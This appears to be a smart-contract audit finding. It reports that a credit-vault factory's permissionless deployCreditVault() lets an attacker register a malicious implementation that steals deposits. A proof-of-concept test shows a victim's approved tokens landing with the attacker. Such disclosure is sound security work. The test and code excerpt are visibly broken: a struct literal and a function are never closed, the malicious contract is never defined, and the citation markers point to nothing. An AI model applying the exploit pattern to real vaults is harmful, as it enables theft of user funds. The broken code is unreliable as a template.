### Title
Unauthenticated factory deployments allow malicious vault implementations to steal deposits - ([File: contracts/IdleCreditVaultFactory.sol](contracts/IdleCreditVaultFactory.sol))

### Summary
`IdleCreditVaultFactory.deployCreditVault()` is permissionless and accepts caller-supplied credit-vault, strategy, queue, escrow, and underlying-token addresses without verifying that they are authentic or protocol-approved. [1](#0-0) [2](#0-1)  A malicious implementation can therefore receive an official `CreditVaultDeployed` event and steal every underlying token subsequently approved to or deposited through its proxy. [3](#0-2) [4](#0-3) 

### Finding Description
The factory accepts `cvParams.implementation`, `cvParams.underlying`, `strategyData.implementation`, and ancillary implementation addresses directly from the caller. [2](#0-1)  `_deployBaseCreditVault()` deploys transparent proxies around these arbitrary implementations and immediately delegates the selected initializer call into them. [5](#0-4)  There is no registry lookup, implementation hash check, underlying-token whitelist, or other provenance validation before deployment. [6](#0-5) 

A malicious credit-vault implementation only needs to expose the initializer selector expected by the proxy and no-op versions of the configuration functions called afterward. [7](#0-6) [8](#0-7)  After deployment, the factory emits `CreditVaultDeployed`, which can make the malicious proxy appear factory-created even though its implementation is attacker-controlled code. [3](#0-2) 

### Impact Explanation
A victim who relies on factory provenance can approve a real underlying asset to the malicious proxy and call a deposit function such as `depositAA()`. [9](#0-8)  Because proxy calls execute attacker-supplied implementation code in the proxy context, that function can directly execute `underlying.transferFrom(victim, attacker, amount)` instead of performing legitimate tranche accounting. [4](#0-3)  The loss is the full amount approved and deposited by each victim, while the factory still presents the proxy as a deployed credit vault. [3](#0-2) 

### Likelihood Explanation
Any unprivileged caller can invoke `deployCreditVault()`; no owner, treasury, manager, borrower, or deployment-role check restricts the function. [10](#0-9)  The attacker must persuade a victim to use the malicious vault, but the factory event and deployed strategy infrastructure provide false authenticity signals. [11](#0-10)  The same unrestricted pattern also exists in `deployRevolvingCreditVault()`, whose programmable-borrower implementation and ERC4626 vault are caller-selected. [12](#0-11) 

### Recommendation
Restrict deployment to an authorized role or maintain treasury-controlled registries of approved CDO, strategy, queue, escrow, programmable-borrower, and ERC4626 implementations. [4](#0-3)  Maintain a whitelist of supported underlying tokens and revert when `cvParams.underlying` is not approved. [13](#0-12)  If permissionless deployment is intentional, emit and expose implementation identifiers such as `keccak256(implementation.code)` and clearly separate authenticated protocol vaults from arbitrary user-deployed vaults. [3](#0-2)

/// Executes in the factory-deployed proxy context.

contract FactoryMaliciousImplementationTest is Test {
    IdleCreditVaultFactory internal factory;
    Asset internal underlying;
    address internal treasury = address(0xA11CE);
    address internal admin = address(0xAD111);
    address internal manager = address(0xA6E2);
    address internal victim = address(0xC1A1);
    address internal attacker = address(0xBAD);

    function setUp() external {
        IdleCreditVaultFactory implementation = new IdleCreditVaultFactory();
        factory = IdleCreditVaultFactory(address(new TransparentUpgradeableProxy(
            address(implementation),
            admin,
            abi.encodeWithSelector(
                IdleCreditVaultFactory.initialize.selector,
                treasury,
                admin
            )
        )));
        underlying = new Asset();
        underlying.mint(victim, 1_000e6);
    }

    function testFactoryMarkedMaliciousVaultStealsDeposit() external {
        IdleCreditVault strategyImplementation = new IdleCreditVault();
        EvilCDOImplementation evilImplementation = new EvilCDOImplementation();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(evilImplementation),
                limit: 0,
                underlying: address(underlying),
                apr: 12e18,
                epochDuration: 7 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 hours,
                instantWithdrawAprDelta: 1e18,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: treasury,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: false

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImplementation),
                manager: manager,
                borrower: address(0xB077),
                borrowerName: "Borrower"
            });

        vm.recordLogs();
        factory.deployCreditVault(
            cvParams,
            strategyData,
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            })
        );

        address evilVault = _deployedVault(vm.getRecordedLogs());

        vm.startPrank(victim);
        underlying.approve(evilVault, 100e6);
        EvilCDOImplementation(evilVault).depositAA(100e6);
        vm.stopPrank();

        assertEq(underlying.balanceOf(attacker), 100e6);
        assertEq(underlying.balanceOf(victim), 900e6);

    function _deployedVault(Vm.Log[] memory logs)
        internal
        pure
        returns (address vault)
    {
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == keccak256(
                "CreditVaultDeployed(address,address,address,address,address,address)"
            )) {
                (vault,,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
                return vault;
            }
        }
        revert("deployment event not found");
    }
}

  function deployCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    AncillaryParams memory ancillaryParams
  ) external {
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    (IdleCDOEpochVariant cv, IdleCreditVault strategy) =
      _deployBaseCreditVault(strategyData, cvParams);

    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);

    IdleCDOEpochQueue queue = _deployQueue(ancillaryParams, cv, keyringWhitelist);
    IdleCreditVaultWriteOffEscrow writeOffEscrow =
      _deployWriteOffEscrow(ancillaryParams.writeOffImplementation, cv, treasury);

    _finalizeKeyringAdmin(keyringWhitelist, manager);
    // Transfer ownership of strategy and credit vault to treasury
    strategy.transferOwnership(treasury);
    cv.transferOwnership(treasury);

    emit CreditVaultDeployed(
      address(cv),
      address(strategy),
      address(queue),
      address(0),
      keyringWhitelist,
      address(writeOffEscrow)
    );
